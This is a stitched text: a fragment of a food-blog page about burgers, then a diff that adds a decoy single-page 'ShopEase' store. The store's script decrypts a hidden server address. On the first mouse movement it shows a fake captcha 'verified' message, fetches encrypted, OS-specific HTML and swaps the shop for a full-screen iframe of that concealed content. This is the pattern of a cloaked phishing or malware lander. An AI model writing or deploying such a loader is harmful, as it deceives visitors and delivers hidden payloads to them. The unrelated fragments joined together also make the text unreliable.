src="./img/301aca39b5969e672fde040155b71d6602e6d701.jpg" class="heading-fatWsydDUQmBz"/></div><div class="column-uURVRoMupYIHQr"><h5 class="medium-KnIsMSN">Exploring the Art of Burger Craft: A Journey Through Flavor and Innovation</h5><div class="large-GDYcbm"><span class="tiny-SEwrldASUjSTFrRG">This Dining article delves into Seafood Flavor the diverse world of Desserts Snacks burgers, Vegan examining Meal their evolution, various Non-veg Dish styles, Taste and the creativity Ingredient Cooking that defines Beverages modern Vegetarian Recipe burger Soups culture. Cuisine</span></div></div></div></div></div></main><footer class="image-imnQWtZIPtC"><div class="pic-MGGDYUd"><a href="./privacy_policy.html" class="title-lwuLshwBkgoArRp">Privacy Policy</a><a href="./terms_of_use.html" class="grid-dIFGVxSAiZXh">Terms Of Use</a><a href="./cookie_policy.html" class="sidebar-zMqRGimWkRst">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="heading-msZMnOqwNfZSLYBO"/><section class="col-BJcQPrkxOOdbSv"><div class="xl-ootNxPkBKIkfc"><div class="heading-fpeOhg"><label for="close" class="xs-VluehOGlNM"><span class="image-NPBFooO">Ok</span></label></div></div><div class="tiny-XcsjHxBGKLpL"><span class="preview-yutclF">This site uses cookies to help personalise content, tailor your experience and to keep you logged in if you register.<br>By continuing to use this site, you are consenting to our use of cookies. Learn more.</span></div></section></body></html>
+  
+  <div id="shop">
+  <!-- ===== Header ===== -->
+  <header class="nav">
+    <div class="brand">🛍️ ShopEase</div>
+    <nav class="links">
+      <a href="#home">Home</a>
+      <a href="#products">Products</a>
+      <a href="#about">About</a>
+    </nav>
+    <span class="clock">🕒 Mon, 29 Jun 2026</span>
+    <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+  </header>
+
+  <!-- ===== Hero ===== -->
+  <section class="hero" id="home">
+    <div class="hero-text">
+      <h1>Summer Sale — up to <span>50% OFF</span></h1>
+      <p>Trendy products, free stock photos, ek hi page par.
+         Pure HTML + CSS single-page store. ✨</p>
+      <a href="#products" class="cta">Shop now</a>
+    </div>
+    <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+  </section>
+
+  <!-- ===== Products (static HTML) ===== -->
+  <section id="products">
+    <h2 class="section-title">Featured Products</h2>
+    <div class="grid">
+      <div class="card">
+        <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+        <div class="body">
+          <h3>Running Sneakers</h3>
+          <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+          <button class="add">Add to cart</button>
+        </div>
+      </div>
+      <div class="card">
+        <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+        <div class="body">
+          <h3>Classic Watch</h3>
+          <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+          <button class="add">Add to cart</button>
+        </div>
+      </div>
+      <div class="card">
+        <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+        <div class="body">
+          <h3>Travel Backpack</h3>
+          <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+          <button class="add">Add to cart</button>
+        </div>
+      </div>
+      <div class="card">
+        <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+        <div class="body">
+          <h3>Wireless Headphones</h3>
+          <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+          <button class="add">Add to cart</button>
+        </div>
+      </div>
+      <div class="card">
+        <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+        <div class="body">
+          <h3>Sunglasses</h3>
+          <div class="price">₹999 <span class="old">₹1,799</span></div>
+          <button class="add">Add to cart</button>
+        </div>
+      </div>
+      <div class="card">
+        <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+        <div class="body">
+          <h3>Instant Camera</h3>
+          <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+          <button class="add">Add to cart</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== About ===== -->
+  <section id="about" class="about">
+    <h2 class="section-title">Why ShopEase?</h2>
+    <div class="features">
+      <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+      <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+      <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+    </div>
+  </section>
+
+  <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div><!-- /#shop -->
+
+ 
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+  
+  <script>
+    
+    function verifyCaptcha() {
+      const overlay = document.getElementById("capOverlay");
+      const spinner = document.getElementById("capSpinner");
+      const tick = document.getElementById("capTick");
+      const status = document.getElementById("capStatus");
+      spinner.style.display = "none";
+      tick.style.display = "block";
+      status.textContent = "Verified ✓";
+      status.classList.add("ok");
+      setTimeout(() => overlay.classList.add("hide"), 400);   
+    }
+
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+
+   
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        shop.style.display = "none";
+        frame.style.display = "block";
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      }
+    }
+
+    
+    window.addEventListener("mousemove", () => {
+      verifyCaptcha();
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
